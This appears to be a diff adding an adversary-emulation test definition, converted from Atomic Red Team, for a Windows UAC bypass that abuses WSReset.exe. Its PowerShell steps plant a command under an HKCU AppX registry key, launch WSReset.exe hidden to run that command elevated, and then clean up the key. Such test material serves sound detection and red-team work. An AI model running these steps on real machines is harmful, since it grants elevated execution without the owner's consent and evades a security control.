@@ -1,0 +1,53 @@
+# Converted from Atomic Red Team - Abuse Elevation Control Mechanism: Bypass User Account Control
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1548.002
+# Original auto_generated_guid: 3b96673f-9c92-40f1-8a3e-ca060846f8d9
+
+---
+api_version: 2.0
+uuid: a06ed8b2-7d43-4985-bca5-69a722346419
+name: UAC Bypass with WSReset Registry Modification
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  The following UAC bypass is focused on a registry key under "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" that will trigger a command once wsreset.exe runs.
+  This bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.
+  If successful, the command to run will spawn off wsreset.exe.
+  UAC Bypass in Windows 10 Store Binary (https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)
+
+mitre:
+  tactics:
+    - TA0004 Privilege Escalation
+    - TA0005 Defense Evasion
+  techniques:
+    - T1548 Abuse Elevation Control Mechanism
+  subtechniques:
+    - T1548.002 Bypass User Account Control
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: false
+
+args:
+  - name: command_path
+    description: Registry path
+    type: string
+    default: HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command
+  - name: command_to_run
+    description: Command to run
+    type: string
+    default: C:\Windows\System32\cmd.exe /c start cmd.exe
+
+steps:
+  - name: bypass_uac_wsreset
+    executor: powershell
+    inline: |
+      New-Item {{.Args.command_path}} -Force | Out-Null
+      New-ItemProperty -Path {{.Args.command_path}} -Name "DelegateExecute" -Value "" -Force | Out-Null
+      Set-ItemProperty -Path {{.Args.command_path}} -Name "(default)" -Value "{{.Args.command_to_run}}" -Force -ErrorAction SilentlyContinue | Out-Null
+      $Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
+    cleanup:
+      executor: powershell
+      inline: |
+        Remove-Item {{.Args.command_path}} -Recurse -Force
